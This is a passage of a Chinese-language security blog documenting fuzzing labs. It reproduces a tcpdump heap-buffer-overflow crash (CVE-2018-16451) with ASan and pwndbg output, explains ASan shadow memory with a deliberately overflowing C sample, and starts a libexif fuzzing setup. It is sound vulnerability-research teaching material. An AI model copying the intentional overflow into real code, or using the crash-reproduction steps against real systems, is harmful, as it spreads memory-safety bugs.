redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">2727</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>程序 crash 的原因为 heap-buffer-overflow（堆溢出）</li>
</ul>
<p>[<strong>CVE-2017-13028</strong>] 的漏洞点是 <code>bootp_print()</code> ，而这里的漏洞点是 <code>print_trans()</code></p>
<p>后来发现这个是 <strong>[CVE-2018-16451]</strong> 的漏洞点，因为没有 fuzz 出 [<strong>CVE-2017-13028</strong>] 的漏洞，而我又不想继续 fuzz 了，干脆就复现 <strong>[CVE-2018-16451]</strong> 算了</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2018-16451">阿里云漏洞库 (aliyun.com)</a> </li>
</ul>
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./tcpdump -vvvvXX -ee -nn -r ./test</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>print_trans</code> 打上断点，单步到执行 <code>strcmp</code> 的位置：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x712465</span> &lt;print_trans+<span class="number">1509</span>&gt;    call   <span class="built_in">strcmp</span>                      &lt;<span class="built_in">strcmp</span>&gt;</span><br><span class="line">       s1: <span class="number">0x611000000101</span> ◂— <span class="number">0x534c49414d5c</span> <span class="comment">/* &#x27;\\MAILS&#x27; */</span></span><br><span class="line">       s2: <span class="number">0x34e960</span> (str<span class="number">.275</span>) ◂— <span class="string">&#x27;\\MAILSLOT\\BROWSE&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>再次单步过后，ASan 检测到内存错误，并中断程序：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">5418</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x611000000107</span> at pc <span class="number">0x0000003d0235</span> bp <span class="number">0x7fffffffbb30</span> sp <span class="number">0x7fffffffb2d8</span></span><br><span class="line">READ of size <span class="number">7</span> at <span class="number">0x611000000107</span> thread T0</span><br><span class="line">[Attaching after Thread <span class="number">0x7ffff7947800</span> (LWP <span class="number">5418</span>) fork to child process <span class="number">5422</span>]</span><br><span class="line">[New inferior <span class="number">2</span> (process <span class="number">5422</span>)]</span><br><span class="line">[Detaching after fork from parent process <span class="number">5418</span>]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">5418</span>) detached]</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">process <span class="number">5422</span> is executing <span class="keyword">new</span> program: /usr/lib/llvm<span class="number">-11</span>/bin/llvm-symbolizer</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">1.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x712465</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我第一时间不清楚 ASan 给出的报错信息和程序漏洞之间的关系，所以跟进 <code>strcmp</code> 继续调试</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x3d0252</span> &lt;<span class="built_in">strcmp</span>+<span class="number">482</span>&gt;    call   <span class="number">0x43c5c0</span>                      &lt;<span class="number">0x43c5c0</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>一直跟进到 ASan 记录的地址：<code>0x3d0235</code>（我发现这个 <code>strcmp</code> 的地址有点怪，好像不在 libc 里面）</li>
<li>对比该汇编指令执行前后 [rdx] 寄存器的变化：（讲真，这里我没有看出溢出点）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*RDX  <span class="number">0x14</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffbb30</span> —▸ <span class="number">0x611000000101</span> ◂— <span class="number">0x534c49414d5c</span> <span class="comment">/* &#x27;\\MAILS&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x3d0235</span> (<span class="built_in">strcmp</span>+<span class="number">453</span>) ◂— lea    rdx, [rbp - <span class="number">0x858</span>]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x3d0235</span> &lt;<span class="built_in">strcmp</span>+<span class="number">453</span>&gt;    lea    rdx, [rbp - <span class="number">0x858</span>]</span><br><span class="line">   <span class="number">0x3d023c</span> &lt;<span class="built_in">strcmp</span>+<span class="number">460</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x3d023f</span> &lt;<span class="built_in">strcmp</span>+<span class="number">463</span>&gt;    mov    rsi, qword ptr [rbp - <span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x3d0243</span> &lt;<span class="built_in">strcmp</span>+<span class="number">467</span>&gt;    mov    rcx, qword ptr [rbp - <span class="number">0x38</span>]</span><br><span class="line">   <span class="number">0x3d0247</span> &lt;<span class="built_in">strcmp</span>+<span class="number">471</span>&gt;    <span class="keyword">xor</span>    r8d, r8d</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*RDX  <span class="number">0x7fffffffb2d8</span> —▸ <span class="number">0x7ffff7b376a0</span> (_IO_2_1_stdout_) —▸ <span class="number">0xfbad2a84</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffbb30</span> —▸ <span class="number">0x611000000101</span> ◂— <span class="number">0x534c49414d5c</span> <span class="comment">/* &#x27;\\MAILS&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x3d023c</span> (<span class="built_in">strcmp</span>+<span class="number">460</span>) ◂— mov    rdi, rax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x3d0235</span> &lt;<span class="built_in">strcmp</span>+<span class="number">453</span>&gt;    lea    rdx, [rbp - <span class="number">0x858</span>]</span><br><span class="line"> ► <span class="number">0x3d023c</span> &lt;<span class="built_in">strcmp</span>+<span class="number">460</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x3d023f</span> &lt;<span class="built_in">strcmp</span>+<span class="number">463</span>&gt;    mov    rsi, qword ptr [rbp - <span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x3d0243</span> &lt;<span class="built_in">strcmp</span>+<span class="number">467</span>&gt;    mov    rcx, qword ptr [rbp - <span class="number">0x38</span>]</span><br><span class="line">   <span class="number">0x3d0247</span> &lt;<span class="built_in">strcmp</span>+<span class="number">471</span>&gt;    <span class="keyword">xor</span>    r8d, r8d</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fffffffbb30</span><span class="number">-0x858</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x7fffffffb2d8</span> —▸ <span class="number">0x7ffff7b376a0</span> (_IO_2_1_stdout_) —▸ <span class="number">0xfbad2a84</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后执行 ASan 中的函数（ASan 已经劫持程序流了）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x43ca69</span>    call   __asan::ScopedInErrorReport::~ScopedInErrorReport()                      &lt;__asan::ScopedInErrorReport::~ScopedInErrorReport()&gt;</span><br><span class="line">       rdi: <span class="number">0x7fffffffb280</span> —▸ <span class="number">0x611000000107</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7fffffffabe0</span> ◂— <span class="number">0x7fff00000016</span></span><br><span class="line">       rdx: <span class="number">0x690</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>想要理解 ASan 的报错信息，可以参考以下博客：（这里就记录一下我的学习笔记）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43708622/article/details/117966519">理解ASAN的shadow memory和读懂报错信息</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/21cnbao/article/details/107096665">ASAN和HWASAN原理解析</a> </li>
</ul>
<p><strong>shadow memory</strong></p>
<p>shadow memory 也是内存中的一块区域，但与 main memory 又不同，shadow memory 有中元数据的思想，其中的数据放映的是 main memory 的状态信息，因此，可以将 shadow memory 看做是 main memory 的元数据，而 main memory 中存储的才是程序真正的数据</p>
<p>Malloc 函数返回的地址通常是8字节对齐的，因此可以用9种状态，来表示8字节对齐的内存可访问(可寻址)状态：</p>
<img src="/2022/08/16/Fuzz%20Lab3-TCPdump/1660657166128.png" class width="1660657166128"> 
<ul>
<li>所有的8个字节都可寻址，shadow memory 值为0</li>
<li>所有的8个字节都不可寻址，shadow memory 值为负数</li>
<li>前 k(0≤k≤7) 个字节可寻址，剩下的 7-k 个字节不可寻址，shadow memory 的值为k</li>
</ul>
<p>我们知道 malloc 函数返回的地址通常是8字节对齐的，因此任意一个由（对齐的）8字节所组成的内存区域必然落在以上9种状态之中，这9种状态便可以用 shadow memory 中的一个字节来进行编码</p>
<p>所有的8个字节都不可寻址其实可以继续分为多种情况，譬如： </p>
<ul>
<li>Heap left redzone:       fa</li>
<li>Freed heap region:       fd</li>
<li>Stack left redzone:      f1</li>
<li>Stack mid redzone:       f2</li>
<li>Stack right redzone:     f3</li>
<li>Stack after return:      f5</li>
<li>Stack use after scope:   f8</li>
<li>Global redzone:          f9</li>
<li>Global init order:       f6</li>
<li>Poisoned by user:        f7</li>
<li>Container overflow:      fc</li>
<li>Array cookie:            ac</li>
<li>Intra object redzone:    bb</li>
<li>ASan internal:           fe</li>
<li>Left alloca redzone:     ca</li>
<li>Right alloca redzone:    cb</li>
<li>Shadow gap:              cc</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2021 junfu0903@aliyun.com.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unpublished copyright. All rights reserved. This material contains</span></span><br><span class="line"><span class="comment"> * proprietary information that should be used or copied only within</span></span><br><span class="line"><span class="comment"> * junfu0903@aliyun.com, except with written permission of junfu0903@aliyun.com.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @file heap_buffer_overflow.c</span></span><br><span class="line"><span class="comment"> * @brief</span></span><br><span class="line"><span class="comment"> * @author junfu0903@aliyun.com</span></span><br><span class="line"><span class="comment"> * @version 1.0.0</span></span><br><span class="line"><span class="comment"> * @date 2021-06-15 10:18:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    p[<span class="number">17</span>] = <span class="number">12</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test -fsanitize=address -fsanitize-recover=all -fsanitize=leak -no-pie -fno-omit-frame-pointer -g </span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">==<span class="number">6154</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x602000000021</span> at pc <span class="number">0x00000040121b</span> bp <span class="number">0x7fff11080090</span> sp <span class="number">0x7fff11080080</span> <span class="comment">/* 对应代码的位置 */</span></span><br><span class="line">WRITE of size <span class="number">1</span> at <span class="number">0x602000000021</span> thread T0 <span class="comment">/* heap中的溢出点 */</span></span><br><span class="line">    #<span class="number">0</span> <span class="number">0x40121a</span> in main /home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test.c:<span class="number">22</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x7f9992b66082</span> in __libc_start_main ../csu/libc-start.c:<span class="number">308</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x4010fd</span> in _start (/home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test+<span class="number">0x4010fd</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x602000000021</span> is located <span class="number">1</span> bytes to the right of <span class="number">16</span>-byte region [<span class="number">0x602000000010</span>,<span class="number">0x602000000020</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x7f9992e41808</span> in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:<span class="number">144</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x4011db</span> in main /home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test.c:<span class="number">21</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x7f9992b66082</span> in __libc_start_main ../csu/libc-start.c:<span class="number">308</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/yhellow/桌面/<span class="built_in">exp</span>/shadow test/test.c:<span class="number">22</span> in main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff7fb0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7fc0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7fd0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7fe0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c047fff7ff0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x0c047fff8000</span>: fa fa <span class="number">00</span> <span class="number">00</span>[fa]fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8010</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8020</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8030</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8040</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff8050</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">6154</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>单步到 <code>0x40121b</code> 处：（程序提示的 <code>0x40121b</code> 就是发生溢出的地方）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x401216</span> &lt;main+<span class="number">96</span>&gt;     call   __asan_report_store1_noabort@plt                      &lt;__asan_report_store1_noabort@plt&gt;</span><br><span class="line">       rdi: <span class="number">0x602000000021</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x1</span></span><br><span class="line">       rdx: <span class="number">0x1</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7718d01</span> (__asan::instance+<span class="number">57089</span>) ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">0x40121b</span> &lt;main+<span class="number">101</span>&gt;    mov    byte ptr [rbx], <span class="number">0xc</span> <span class="comment">/* 溢出点 */</span></span><br></pre></td></tr></table></figure>
<p>根据计算公式 <strong>Shadow = (Mem &gt;&gt; 3) + 0x7fff8000</strong>（64位）：</p>
<ul>
<li>mem 的地址 0x602000000021</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: hex((<span class="number">0x602000000021</span>&gt;&gt;<span class="number">3</span>)+<span class="number">0x7fff8000</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">&#x27;0xc047fff8004&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>得到 shadow memory 的地址是 0xC047FFF8004，刚好就是上图中由中括号括起来的 [fa]（发生溢出的 heap 地址空间）</li>
<li>而 0xC047FFF8002 和 0xC047FFF8003 两个 shadow memory 对应的值都为 0，说明这两个 shadow memory 对应的 main memory 是可寻址的（刚好就是 <code>malloc(16)</code> 申请的 0x10 字节的空间）</li>
</ul>
<p>从这里也可以窥探到 <strong>[CVE-2018-16451]</strong> 的漏洞点，但是我把 crash 放入没有 ASan 的程序却复现不出漏洞（很头痛）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/15/Fuzz%20Lab2-libexif/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/15/Fuzz%20Lab2-libexif/" class="post-title-link" itemprop="url">Fuzz Lab2-libexif</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-15 15:31:10" itemprop="dateCreated datePublished" datetime="2022-08-15T15:31:10+08:00">2022-08-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:09:18" itemprop="dateModified" datetime="2022-10-10T00:09:18+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab2：libexif"><a href="#Fuzz-Lab2：libexif" class="headerlink" title="Fuzz-Lab2：libexif"></a>Fuzz-Lab2：libexif</h2><p>这次我们将 fuzz <strong>libexif</strong> EXIF 解析库（EXIF 信息，是可交换图像文件的缩写，专门为数码相机的照片设定，可以记录数码照片的属性信息和拍摄数据），目标是在 libexif 0.6.14 中找到 [<strong>CVE-2009-3895</strong>] 的 crash/PoC 和 [<strong>CVE-2012-2836</strong>] 的另一个 crash</p>
<ul>
<li><strong>CVE-2009-3895</strong> 是一种基于堆的缓冲区溢出，可以使用无效的 EXIF 图像触发<ul>
<li>基于堆的缓冲区溢出是一种发生在堆数据区域的缓冲区溢出，通常与显式动态内存管理（使用 malloc() 和 free() 函数的分配/释放）有关</li>
<li>因此，远程攻击者可以利用此问题，在使用受影响库的应用程序上下文中执行任意代码</li>
</ul>
</li>
<li><strong>CVE-2012-2836</strong> 是一个越界读取漏洞，可以通过带有精心制作的 EXIF 标签的图像触发<ul>
<li>越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞</li>
<li>因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息</li>
</ul>
</li>
</ul>
<p>学习的目标：</p>
<ul>
<li>使用外部应用程序对库进行模糊测试</li>
<li>使用 <strong>afl-clang-lto</strong>，一种比 <strong>afl-clang-fast</strong> 更快且提供更好结果的无碰撞仪器</li>
<li>使用 Eclipse IDE 作为 GDB 控制台的简单替代品进行分类</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><ul>
<li>找到一个使用 libexif 库的接口应用程序</li>
<li>创建 exif 样本的种子语料库</li>
<li>使用 afl-clang-lto 编译 libexif 和选择的应用程序进行模糊测试</li>
<li>Fuzz libexif，直到你有一些独特的崩溃</li>
<li>对崩溃进行分类以找到每个漏洞的 PoC</li>
<li>修复问题</li>
</ul>
<h2 id="CVE-2009-3895"><a href="#CVE-2009-3895" class="headerlink" title="CVE-2009-3895"></a>CVE-2009-3895</h2><h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME # 创建目录</span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; cd fuzzing_libexif/</span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://sourceforge.net/projects/libexif/files/libexif/0.6.18/libexif-0.6.18.tar.gz # 获取libexif</span><br><span class="line">tar -zxvf libexif-0.6.18.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz # 下载使用库接口的应用程序</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br><span class="line"></span><br><span class="line">cd libexif-0.6.18 # 编译libexif</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;/home/yhellow/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">cd exif-exif-0_6_15-release/</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;/home/yhellow/fuzzing_libexif/tool/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>测试 exif 能否运行只需要输入： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_libexif/tool/bin/exif</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>效果如下：</li>
</ul>
